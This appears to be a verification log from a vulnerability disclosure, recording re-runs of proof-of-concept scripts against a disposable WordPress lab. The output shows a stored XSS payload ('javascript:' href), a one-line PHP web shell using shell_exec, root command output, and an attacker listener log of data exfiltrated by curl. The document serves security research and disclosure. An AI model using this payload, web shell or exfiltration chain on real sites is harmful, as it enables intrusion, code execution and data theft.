# Verification — 2026-11-09

The scripts in `poc/` were re-run against a fresh start of the same disposable lab
(`wpsite` + `wpdb`, WordPress 7.1.2, `hello.php` at the canonical baseline
`1244904e…6d58fe53`) to confirm that the parameterised versions reproduce the
original behaviour without any hardcoded machine paths.

## 1. Minimal validation

```
[*] target: http://127.0.0.1:18080   (LAB ONLY)
[*] acting as: author  uid=4  roles=['author']
[*] post created: #973  http=201  status=publish  author=4
[*] server  href (kses, pre-hydration): 'https://example.com/'
[*] client  href (post-hydration):      'javascript:window.__XSS=1;void 0'
[*] click marker executed:               1

PASS — stored XSS validated: server says https, browser executes javascript:
```

Post deleted afterwards: `cleaned_up: true`.

## 2. Command execution

```
author post: {'id': 974, 'http': 201, 'status': 'publish', 'author': 4}
written file: <?php echo shell_exec($_GET['cmd']);

$ id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),…
…
restored_ok: True
```

`hello.php` restored to `1244904e…6d58fe53`; post removed.

## 3. Outbound exfiltration

```
=== attacker listener log ===
2026-11-09T08:25:05.320063+00:00 POST /exfil from 172.19.0.3 UA=curl/8.22.0
  BODY: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),…
cb722bffb922
Linux 6.6.87.2-microsoft-standard-WSL2 x86_64 Linux

restored_ok: True | post_deleted: True
```

`172.19.0.3` is the WordPress container, `172.19.0.1` the attacker host (docker
bridge gateway).

## Notes

- The JSON files in this directory (`poc_simple_validation.json`,
  `rce_cmd_chain.json`, `rce_exfil_chain.json`, `demo.json`, `exfil-c2.log`) are
  the original 2026-10-13 captures referenced by the write-up, not the re-run.
- Root is a property of the lab: WordPress was started with `wp server --allow-root`.
  The portable claim is code execution as the web user.
